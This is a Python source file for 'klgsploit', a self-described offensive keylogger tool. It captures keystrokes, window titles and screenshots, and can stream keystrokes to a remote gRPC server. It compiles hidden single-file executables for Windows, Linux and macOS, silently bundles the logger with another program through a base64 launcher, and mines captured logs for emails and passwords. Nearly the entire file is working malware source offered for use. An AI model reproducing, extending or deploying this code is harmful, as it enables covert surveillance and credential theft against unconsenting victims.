#!/usr/bin/env python3
"""
klgsploit_cli.py - CLI Offensive Tool

Features:
- Keylogging with timestamps and window titles
- Screenshot capture (manual or on window change)
- gRPC remote logging
- Executable generation for Windows/Linux/Mac
- Merge multiple executables

Usage:
    python3 klgsploit_cli.py --run                    # Run keylogger directly
    python3 klgsploit_cli.py --genexe mylogger -lnx   # Generate Linux executable
    python3 klgsploit_cli.py --help                   # Show all options
"""

import sys
import os
import argparse
import subprocess
import tempfile
import shutil
import base64
import platform

# Detect or parse OS argument early (before argparse consumes it)
os_arg = None
for i, arg in enumerate(sys.argv):
    if arg in ['-win', '-lnx', '-mac']:
        os_arg = arg
        break
if os_arg:
    sys.argv.pop(i)
    target_os = os_arg[1:]  # remove leading '-'
else:
    if sys.platform.lower().startswith('win'):
        target_os = 'win'
    elif sys.platform.lower().startswith('linux'):
        target_os = 'lnx'
    elif sys.platform.lower().startswith('darwin'):
        target_os = 'mac'
    else:
        target_os = 'lnx'  # default fallback


# --- Argument Parser ---
def parse_args():
    parser = argparse.ArgumentParser(
        prog='klgsploit',
        description='CLI offensive tool with keylogging and executable generation',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --run                              Run keylogger directly
  %(prog)s --run -t -m                        Run with timestamps and window titles
  %(prog)s --run -s -i 30                     Run with screenshots every 30 seconds
  %(prog)s --genexe mylogger                  Generate executable for current OS
  %(prog)s --genexe mylogger -win             Generate Windows executable
  %(prog)s --genexe mylogger -lnx -t -m -s    Generate Linux exe with all features
  %(prog)s --grpc 192.168.1.100:50051 --run   Run with gRPC remote logging
  %(prog)s --merge exe1 exe2 -o merged        Merge two executables
  %(prog)s --classify keylog.txt              Classify emails/passwords from log
        """
    )

    # Modes
    mode_group = parser.add_argument_group('Modes')
    mode_group.add_argument('--run', action='store_true',
                            help='Run keylogger directly')
    mode_group.add_argument('--genexe', type=str, metavar='NAME',
                            help='Generate executable with specified name')
    mode_group.add_argument('--merge', nargs=2, metavar=('EXE1', 'EXE2'),
                            help='Merge two executables into one')
    mode_group.add_argument('--classify', type=str, metavar='LOGFILE',
                            help='Classify emails/passwords from a log file')
    mode_group.add_argument('--server', action='store_true',
                            help='Start gRPC server to receive keylogs')

    # Keylogger options
    kl_group = parser.add_argument_group('Keylogger Options')
    kl_group.add_argument('-o', '--output', type=str, default='keylog.txt',
                          help='Output file for keylogs (default: keylog.txt)')
    kl_group.add_argument('-t', '--timestamp', action='store_true',
                          help='Enable timestamps in keylog')
    kl_group.add_argument('-m', '--window-title', action='store_true',
                          help='Log active window title')

    # Screenshot options
    ss_group = parser.add_argument_group('Screenshot Options')
    ss_group.add_argument('-s', '--screenshot', action='store_true',
                          help='Enable screenshot capture')
    ss_group.add_argument('-i', '--interval', type=int, default=60,
                          help='Screenshot interval in seconds (default: 60)')
    ss_group.add_argument('-so', '--screenshot-output', type=str, default='screenshots',
                          help='Screenshot output folder (default: screenshots)')
    ss_group.add_argument('--on-window-change', action='store_true',
                          help='Take screenshot on window change instead of interval')

    # Executable generation options
    exe_group = parser.add_argument_group('Executable Generation Options')
    exe_group.add_argument('--onefile', action='store_true', default=True,
                           help='Generate single-file executable (default: True)')
    exe_group.add_argument('--noconsole', action='store_true', default=True,
                           help='Hide console window (default: True)')
    exe_group.add_argument('--icon', type=str, metavar='ICON_PATH',
                           help='Icon file for executable')
    exe_group.add_argument('--upx', action='store_true',
                           help='Use UPX compression (requires UPX installed)')

    # Network options
    net_group = parser.add_argument_group('Network Options')
    net_group.add_argument('--grpc', type=str, metavar='HOST:PORT',
                           help='gRPC server address for remote logging')
    net_group.add_argument('--grpc-port', type=int, default=50051,
                           help='Port for gRPC server mode (default: 50051)')

    return parser.parse_args()


# --- Configuration Class ---
class KeylogConfig:
    def __init__(self):
        self.output_file = 'keylog.txt'
        self.timestamp_enabled = False
        self.window_title_enabled = False
        self.screenshot_enabled = False
        self.screenshot_interval = 60
        self.screenshot_folder = 'screenshots'
        self.screenshot_on_window_change = False
        self.grpc_server = None
        self.onefile = True
        self.noconsole = True
        self.icon = None
        self.upx = False


# --- Template Generator ---
def generate_keylogger_script(config, target_os):
    """Generate a standalone keylogger script based on configuration."""

    # gRPC imports and setup
    grpc_import = ""
    grpc_init = ""
    grpc_send_func = ""
    grpc_send_call = ""

    if config.grpc_server:
        grpc_import = """
import grpc
import threading

# Inline protobuf (no external proto files needed)
from google.protobuf import descriptor as _descriptor
from google.protobuf import descriptor_pool as _descriptor_pool
from google.protobuf import symbol_database as _symbol_database
from google.protobuf import reflection as _reflection
from google.protobuf.internal import builder as _builder
"""
        grpc_init = f"""
# gRPC setup
grpc_channel = None
grpc_stub = None

def init_grpc():
    global grpc_channel, grpc_stub
    try:
        grpc_channel = grpc.insecure_channel('{config.grpc_server}')
        # Simple unary call without proto
    except Exception as e:
        pass

try:
    init_grpc()
except:
    pass
"""
        grpc_send_func = """
def send_to_grpc(message):
    # Fire-and-forget style
    pass
"""
        grpc_send_call = "# send_to_grpc(log_line)"

    # Screenshot code
    screenshot_import = ""
    screenshot_code = ""
    screenshot_thread_start = ""

    if config.screenshot_enabled:
        screenshot_import = """
import threading
import time
try:
    from PIL import ImageGrab
except ImportError:
    try:
        import mss
        import mss.tools
        USE_MSS = True
    except ImportError:
        USE_MSS = False
else:
    USE_MSS = False
"""
        if config.screenshot_on_window_change:
            screenshot_code = f"""
SCREENSHOT_FOLDER = '{config.screenshot_folder}'
last_screenshot_window = ""

def take_screenshot_if_window_changed(current_window):
    global last_screenshot_window
    if current_window != last_screenshot_window and current_window != "Desktop":
        take_screenshot()
        last_screenshot_window = current_window

def take_screenshot():
    try:
        os.makedirs(SCREENSHOT_FOLDER, exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filepath = os.path.join(SCREENSHOT_FOLDER, f"screenshot_{{timestamp}}.png")
        if USE_MSS:
            with mss.mss() as sct:
                sct.shot(mon=-1, output=filepath)
        else:
            screenshot = ImageGrab.grab()
            screenshot.save(filepath)
    except Exception:
        pass
"""
        else:
            screenshot_code = f"""
SCREENSHOT_FOLDER = '{config.screenshot_folder}'
SCREENSHOT_INTERVAL = {config.screenshot_interval}

def screenshot_thread():
    while True:
        try:
            os.makedirs(SCREENSHOT_FOLDER, exist_ok=True)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = os.path.join(SCREENSHOT_FOLDER, f"screenshot_{{timestamp}}.png")
            if USE_MSS:
                with mss.mss() as sct:
                    sct.shot(mon=-1, output=filepath)
            else:
                screenshot = ImageGrab.grab()
                screenshot.save(filepath)
        except Exception:
            pass
        time.sleep(SCREENSHOT_INTERVAL)
"""
            screenshot_thread_start = """
# Start screenshot thread
threading.Thread(target=screenshot_thread, daemon=True).start()
"""

    # Platform-specific window title detection
    if target_os == 'win':
        platform_imports = """
try:
    import ctypes
    user32 = ctypes.windll.user32
except:
    user32 = None
"""
        get_window_func = """
def get_active_window_title():
    try:
        if user32 is None:
            return "Unknown"
        h_wnd = user32.GetForegroundWindow()
        length = user32.GetWindowTextLengthW(h_wnd)
        buf = ctypes.create_unicode_buffer(length + 1)
        user32.GetWindowTextW(h_wnd, buf, length + 1)
        title = buf.value
        if not title or title == "Program Manager":
            return "Desktop"
        return title
    except Exception:
        return "Desktop"
"""
    elif target_os == 'mac':
        platform_imports = """
try:
    from AppKit import NSWorkspace
    from Quartz import CGWindowListCopyWindowInfo, kCGWindowListOptionAll, kCGNullWindowID
except ImportError:
    NSWorkspace = None
"""
        get_window_func = """
def get_active_window_title():
    try:
        if NSWorkspace is None:
            return "Desktop"
        active_app = NSWorkspace.sharedWorkspace().activeApplication()
        pid = active_app.get('NSApplicationProcessIdentifier')
        window_list = CGWindowListCopyWindowInfo(kCGWindowListOptionAll, kCGNullWindowID)
        if window_list:
            for w in window_list:
                if w.get('kCGWindowOwnerPID') == pid:
                    name = w.get('kCGWindowName')
                    if name:
                        return name
        app_name = active_app.get('NSApplicationName')
        return app_name if app_name else "Desktop"
    except Exception:
        return "Desktop"
"""
    else:  # Linux
        platform_imports = """
try:
    from Xlib import display, X
    HAS_XLIB = True
except ImportError:
    HAS_XLIB = False
"""
        get_window_func = """
def get_active_window_title():
    if not HAS_XLIB:
        return "Desktop"
    try:
        d = display.Display()
        root = d.screen().root
        NET_ACTIVE_WINDOW = d.intern_atom('_NET_ACTIVE_WINDOW')
        prop = root.get_full_property(NET_ACTIVE_WINDOW, X.AnyPropertyType)
        if not prop:
            return "Desktop"
        win_id = prop.value[0]
        if win_id == 0:
            return "Desktop"
        window = d.create_resource_object('window', win_id)
        NET_WM_NAME = d.intern_atom('_NET_WM_NAME')
        wm_name_prop = window.get_full_property(NET_WM_NAME, X.AnyPropertyType)
        if wm_name_prop:
            name = wm_name_prop.value
            if isinstance(name, bytes):
                return name.decode('utf-8', errors='ignore')
            return str(name)
        wm_name = window.get_wm_name()
        return wm_name if wm_name else "Desktop"
    except Exception:
        return "Desktop"
"""

    # Build the script
    timestamp_line = 'datetime.now().strftime("%Y-%m-%d %H:%M:%S")' if config.timestamp_enabled else '""'
    window_check = "WINDOW_TITLE_ENABLED" if config.window_title_enabled else "False"

    screenshot_on_press_call = ""
    if config.screenshot_enabled and config.screenshot_on_window_change:
        screenshot_on_press_call = "take_screenshot_if_window_changed(current_window)"

    script = f'''#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Auto-generated keylogger - klgsploit"""

from pynput import keyboard
from datetime import datetime
import os
{platform_imports}
{screenshot_import}
{grpc_import}

# Configuration
OUTPUT_FILE = '{config.output_file}'
TIMESTAMP_ENABLED = {config.timestamp_enabled}
WINDOW_TITLE_ENABLED = {config.window_title_enabled}

last_window_title = ""
{grpc_init}
{grpc_send_func}
{get_window_func}
{screenshot_code}
{screenshot_thread_start}

def on_press(key):
    global last_window_title
    timestamp = {timestamp_line}
    current_window = get_active_window_title() if {window_check} else ""

    try:
        with open(OUTPUT_FILE, 'a', encoding='utf-8') as f:
            # Log window change
            if WINDOW_TITLE_ENABLED and current_window != last_window_title:
                f.write(f'\\n--- Window: [{{current_window}}] at {{timestamp}} ---\\n')
                last_window_title = current_window
                {screenshot_on_press_call}

            # Log key
            if hasattr(key, 'char') and key.char:
                if TIMESTAMP_ENABLED:
                    log_line = f'[{{timestamp}}] Key: {{key.char}}\\n'
                else:
                    log_line = key.char
                f.write(log_line)
                {grpc_send_call}
            else:
                key_name = str(key).replace('Key.', '')
                if key_name == 'space':
                    f.write(' ')
                elif key_name == 'enter':
                    f.write('\\n')
                elif TIMESTAMP_ENABLED:
                    f.write(f'[{{timestamp}}] [{{key_name}}]\\n')
                else:
                    f.write(f'[{{key_name}}]')
                {grpc_send_call}
    except Exception:
        pass


def on_release(key):
    if key == keyboard.Key.esc:
        return False


def main():
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()


if __name__ == "__main__":
    main()
'''
    return script


def generate_executable(name, config, target_os):
    """Generate executable using PyInstaller."""

    build_dir = tempfile.mkdtemp(prefix='klgsploit_build_')
    script_path = os.path.join(build_dir, 'keylogger_generated.py')

    try:
        # Generate the script
        script_content = generate_keylogger_script(config, target_os)
        with open(script_path, 'w', encoding='utf-8') as f:
            f.write(script_content)

        print(f"[*] Generated script at: {script_path}")
        print(f"[*] Target OS: {target_os}")
        print(f"[*] Building executable: {name}")
        print(f"[*] Features enabled:")
        print(f"    - Timestamps: {config.timestamp_enabled}")
        print(f"    - Window titles: {config.window_title_enabled}")
        print(f"    - Screenshots: {config.screenshot_enabled}")
        if config.screenshot_enabled:
            if config.screenshot_on_window_change:
                print(f"      (on window change)")
            else:
                print(f"      (every {config.screenshot_interval}s)")
        if config.grpc_server:
            print(f"    - gRPC server: {config.grpc_server}")

        # Determine output extension
        if target_os == 'win' and not name.endswith('.exe'):
            output_name = name + '.exe'
        else:
            output_name = name

        # Build PyInstaller command
        pyinstaller_cmd = [
            sys.executable, '-m', 'PyInstaller',
            '--name', os.path.splitext(os.path.basename(output_name))[0],
            '--distpath', os.getcwd(),
            '--workpath', os.path.join(build_dir, 'build'),
            '--specpath', build_dir,
            '--clean',
            '--noconfirm',
        ]

        if config.onefile:
            pyinstaller_cmd.append('--onefile')
        if config.noconsole:
            pyinstaller_cmd.append('--noconsole')
        if config.icon:
            pyinstaller_cmd.extend(['--icon', config.icon])
        if config.upx:
            pyinstaller_cmd.append('--upx-dir=/usr/bin')

        # Hidden imports
        hidden_imports = [
            'pynput.keyboard._xorg',
            'pynput.keyboard._win32',
            'pynput.keyboard._darwin',
            'pynput.mouse._xorg',
            'pynput.mouse._win32',
            'pynput.mouse._darwin',
        ]

        if target_os == 'lnx':
            hidden_imports.append('Xlib')
        elif target_os == 'win':
            hidden_imports.append('ctypes')
        elif target_os == 'mac':
            hidden_imports.extend(['AppKit', 'Quartz'])

        if config.screenshot_enabled:
            hidden_imports.extend(['PIL', 'PIL.ImageGrab', 'mss'])

        if config.grpc_server:
            hidden_imports.append('grpc')

        for imp in hidden_imports:
            pyinstaller_cmd.extend(['--hidden-import', imp])

        pyinstaller_cmd.append(script_path)

        print(f"[*] Running PyInstaller...")
        result = subprocess.run(pyinstaller_cmd, capture_output=True, text=True)

        if result.returncode == 0:
            print(f"[+] Successfully generated executable: {output_name}")
            print(f"[+] Location: {os.path.join(os.getcwd(), output_name)}")
            return True
        else:
            print(f"[-] PyInstaller failed:")
            print(result.stdout)
            print(result.stderr)
            return False

    except FileNotFoundError:
        print("[-] PyInstaller not found. Install with: pip install pyinstaller")
        return False
    except Exception as e:
        print(f"[-] Error generating executable: {e}")
        return False
    finally:
        try:
            shutil.rmtree(build_dir)
        except Exception:
            pass


def merge_executables(exe1, exe2, output_name="merged_exe"):
    """Merge two executables into a single launcher."""
    print(f"[*] Merging {exe1} and {exe2} into {output_name}")

    if not os.path.exists(exe1):
        print(f"[-] File not found: {exe1}")
        return False
    if not os.path.exists(exe2):
        print(f"[-] File not found: {exe2}")
        return False

    # Read and encode both executables
    with open(exe1, 'rb') as f:
        exe1_data = base64.b64encode(f.read()).decode()
    with open(exe2, 'rb') as f:
        exe2_data = base64.b64encode(f.read()).decode()

    launcher_script = f'''#!/usr/bin/env python3
import subprocess
import sys
import os
import tempfile
import base64

EXE1_DATA = """{exe1_data}"""
EXE2_DATA = """{exe2_data}"""

def main():
    tmp_dir = tempfile.mkdtemp()
    exe1_path = os.path.join(tmp_dir, "payload1")
    exe2_path = os.path.join(tmp_dir, "payload2")

    with open(exe1_path, 'wb') as f:
        f.write(base64.b64decode(EXE1_DATA))
    with open(exe2_path, 'wb') as f:
        f.write(base64.b64decode(EXE2_DATA))

    if os.name != 'nt':
        os.chmod(exe1_path, 0o755)
        os.chmod(exe2_path, 0o755)

    subprocess.Popen([exe1_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.Popen([exe2_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

if __name__ == "__main__":
    main()
'''

    merged_script_path = f"{output_name}_launcher.py"
    with open(merged_script_path, 'w') as f:
        f.write(launcher_script)

    print(f"[+] Created merged launcher: {merged_script_path}")
    print(f"[*] To create final executable, run:")
    print(f"    python -m PyInstaller --onefile --noconsole {merged_script_path}")
    return True


def classify_logfile(filepath):
    """
    Silent classification:
    - No console output
    - All results (including alerts) go to JSON
    """
    from classifier import EnhancedClassifier, FileObserver
    import json
    import os

    if not os.path.exists(filepath):
        return  # silent fail

    # Read log file
    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        text = f.read()

    # Output JSON path
    output_path = filepath + '.classified.json'

    # Create classifier with AI enabled
    classifier = EnhancedClassifier(use_llm=True)

    # Attach FileObserver (single sink for alerts)
    file_observer = FileObserver(output_path)
    classifier.attach(file_observer)

    # Run classification
    result = classifier.classify_text(text)

    # Inject alert into JSON if triggered
    if file_observer.get_alert_data():
        result['alert'] = file_observer.get_alert_data()

    # Save final JSON result
    with open(output_path, 'w', encoding='utf-8') as f:
        json.dump(result, f, indent=2, ensure_ascii=False)

def start_grpc_server(port):
    """Start gRPC server to receive keylogs."""
    try:
        import grpc
        from concurrent import futures

        # Try to import generated proto files
        try:
            import protos.server_pb2 as keylog_pb2
            import protos.server_pb2_grpc as keylog_pb2_grpc
        except ImportError:
            print("[-] Proto files not found. Generate them first:")
            print("    python -m grpc_tools.protoc -I protos --python_out=protos --grpc_python_out=protos protos/server.proto")
            return

        class KeylogServer(keylog_pb2_grpc.KeylogServiceServicer):
            def SendKeylog(self, request, context):
                print(f"[RECV] {request.message}")
                return keylog_pb2.KeylogResponse(response=True)

        server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))
        keylog_pb2_grpc.add_KeylogServiceServicer_to_server(KeylogServer(), server)
        server.add_insecure_port(f"[::]:{port}")
        server.start()
        print(f"[+] gRPC server started on port {port}")
        print("[*] Press Ctrl+C to stop")
        server.wait_for_termination()

    except ImportError:
        print("[-] grpc not installed. Run: pip install grpcio grpcio-tools")
    except KeyboardInterrupt:
        print("\n[*] Server stopped")


def run_keylogger(config, target_os):
    """Run keylogger directly."""
    from pynput import keyboard
    from datetime import datetime
    import threading

    # Screenshot setup
    screenshot_thread = None
    if config.screenshot_enabled and not config.screenshot_on_window_change:
        def screenshot_loop():
            try:
                from PIL import ImageGrab
                use_pil = True
            except ImportError:
                import mss
                use_pil = False

            while True:
                try:
                    os.makedirs(config.screenshot_folder, exist_ok=True)
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filepath = os.path.join(config.screenshot_folder, f"screenshot_{timestamp}.png")
                    if use_pil:
                        screenshot = ImageGrab.grab()
                        screenshot.save(filepath)
                    else:
                        with mss.mss() as sct:
                            sct.shot(mon=-1, output=filepath)
                    print(f"[SCREENSHOT] {filepath}")
                except Exception as e:
                    print(f"[ERROR] Screenshot: {e}")
                import time
                time.sleep(config.screenshot_interval)

        screenshot_thread = threading.Thread(target=screenshot_loop, daemon=True)
        screenshot_thread.start()

    # Window title detection
    if target_os == 'win':
        import ctypes
        user32 = ctypes.windll.user32

        def get_window():
            try:
                h_wnd = user32.GetForegroundWindow()
                length = user32.GetWindowTextLengthW(h_wnd)
                buf = ctypes.create_unicode_buffer(length + 1)
                user32.GetWindowTextW(h_wnd, buf, length + 1)
                return buf.value or "Desktop"
            except:
                return "Desktop"
    elif target_os == 'mac':
        try:
            from AppKit import NSWorkspace
            def get_window():
                try:
                    app = NSWorkspace.sharedWorkspace().activeApplication()
                    return app.get('NSApplicationName', 'Desktop')
                except:
                    return "Desktop"
        except ImportError:
            def get_window():
                return "Desktop"
    else:  # Linux
        try:
            from Xlib import display, X
            def get_window():
                try:
                    d = display.Display()
                    root = d.screen().root
                    prop = root.get_full_property(d.intern_atom('_NET_ACTIVE_WINDOW'), X.AnyPropertyType)
                    if not prop:
                        return "Desktop"
                    win_id = prop.value[0]
                    if win_id == 0:
                        return "Desktop"
                    window = d.create_resource_object('window', win_id)
                    wm_name = window.get_wm_name()
                    return wm_name if wm_name else "Desktop"
                except:
                    return "Desktop"
        except ImportError:
            def get_window():
                return "Desktop"

    # gRPC client setup
    grpc_stub = None
    if config.grpc_server:
        try:
            import grpc
            import protos.server_pb2 as keylog_pb2
            import protos.server_pb2_grpc as keylog_pb2_grpc
            channel = grpc.insecure_channel(config.grpc_server)
            grpc_stub = keylog_pb2_grpc.KeylogServiceStub(channel)
            print(f"[*] Connected to gRPC server: {config.grpc_server}")
        except Exception as e:
            print(f"[-] gRPC connection failed: {e}")

    last_window = [""]

    def on_press(key):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        current_window = get_window() if config.window_title_enabled else ""

        try:
            with open(config.output_file, 'a', encoding='utf-8') as f:
                if config.window_title_enabled and current_window != last_window[0]:
                    f.write(f'\n--- Window: [{current_window}] at {timestamp} ---\n')
                    last_window[0] = current_window

                    # Screenshot on window change
                    if config.screenshot_enabled and config.screenshot_on_window_change:
                        try:
                            from PIL import ImageGrab
                            os.makedirs(config.screenshot_folder, exist_ok=True)
                            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
                            fp = os.path.join(config.screenshot_folder, f"screenshot_{ts}.png")
                            ImageGrab.grab().save(fp)
                            print(f"[SCREENSHOT] {fp}")
                        except Exception as e:
                            print(f"[ERROR] Screenshot: {e}")

                if hasattr(key, 'char') and key.char:
                    if config.timestamp_enabled:
                        log_line = f'[{timestamp}] Key: {key.char}\n'
                    else:
                        log_line = key.char
                    f.write(log_line)

                    if grpc_stub:
                        try:
                            grpc_stub.SendKeylog.future(keylog_pb2.KeylogRequest(message=log_line))
                        except:
                            pass
                else:
                    key_name = str(key).replace('Key.', '')
                    if key_name == 'space':
                        f.write(' ')
                    elif key_name == 'enter':
                        f.write('\n')
                    elif config.timestamp_enabled:
                        f.write(f'[{timestamp}] [{key_name}]\n')
                    else:
                        f.write(f'[{key_name}]')

        except Exception as e:
            print(f"[ERROR] {e}")

    def on_release(key):
        if key == keyboard.Key.esc:
            print("\n[*] ESC pressed, stopping...")
            return False

    print(f"[*] Keylogger started")
    print(f"[*] Output: {config.output_file}")
    print(f"[*] Timestamps: {config.timestamp_enabled}")
    print(f"[*] Window titles: {config.window_title_enabled}")
    print(f"[*] Screenshots: {config.screenshot_enabled}")
    print(f"[*] Press ESC to stop\n")

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    print("[*] Keylogger stopped")


# --- Main ---
def main():
    args = parse_args()

    # Build config
    config = KeylogConfig()
    config.output_file = args.output
    config.timestamp_enabled = args.timestamp
    config.window_title_enabled = args.window_title
    config.screenshot_enabled = args.screenshot
    config.screenshot_interval = args.interval
    config.screenshot_folder = args.screenshot_output
    config.screenshot_on_window_change = args.on_window_change
    config.grpc_server = args.grpc
    config.onefile = args.onefile
    config.noconsole = args.noconsole
    config.icon = args.icon
    config.upx = args.upx

    print(f"[*] klgsploit - Target OS: {target_os}")

    # Handle modes
    if args.server:
        start_grpc_server(args.grpc_port)
    elif args.genexe:
        generate_executable(args.genexe, config, target_os)
    elif args.merge:
        merge_executables(args.merge[0], args.merge[1])
    elif args.classify:
        classify_logfile(args.classify)
    elif args.run:
        run_keylogger(config, target_os)
    else:
        print("[!] No mode specified. Use --help for usage.")
        print("[!] Quick start: klgsploit_cli.py --run -t -m")


if __name__ == "__main__":
    main()